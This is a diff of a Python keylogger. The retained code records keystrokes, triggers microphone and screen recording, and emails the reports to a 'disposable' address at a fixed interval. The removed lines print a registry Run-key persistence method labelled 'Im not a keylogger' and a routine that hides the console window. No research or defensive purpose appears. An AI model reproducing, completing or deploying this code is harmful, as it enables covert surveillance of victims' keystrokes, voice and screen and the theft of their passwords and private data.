@@ -4,9 +4,6 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-import socket
-import platform
-
 from threading import Timer
 from datetime import datetime
 import keyboard
@@ -24,14 +21,6 @@ import pyautogui
 import cv2
 import numpy as np
 
-from cryptography.fernet import Fernet
-
-import getpass
-from requests import get
-
-from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
-
 send_report_every=180
 email_address = "" # Enter disposable email here
 email_password = "" # Enter email password here
@@ -44,20 +33,6 @@ class Keylogger:
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
-
-    def addStartup(self):  # this will add the file to the startup registry key
-        fp = os.path.dirname(os.path.realpath(__file__))
-        file_name = sys.argv[0].split('\\')[-1]
-        new_file_path = fp + '\\' + file_name
-        keyVal = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
-        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-        SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,new_file_path)
-
-    def Hide(self):
-        import win32console
-        import win32gui
-        win = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(win, 0)
 
     def callback(self, event):
         name = event.name
@@ -168,7 +143,6 @@ class Keylogger:
             self.end_dt = datetime.now()
             self.update_filename()
             if self.report_method == "email":
-                # self.Hide()
                 self.report_to_file()
                 self.microphone()
                 self.screenrecorder()
@@ -204,5 +178,4 @@ class Keylogger:
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=send_report_every, report_method="email")
-    # keylogger.addStartup()
     keylogger.start()
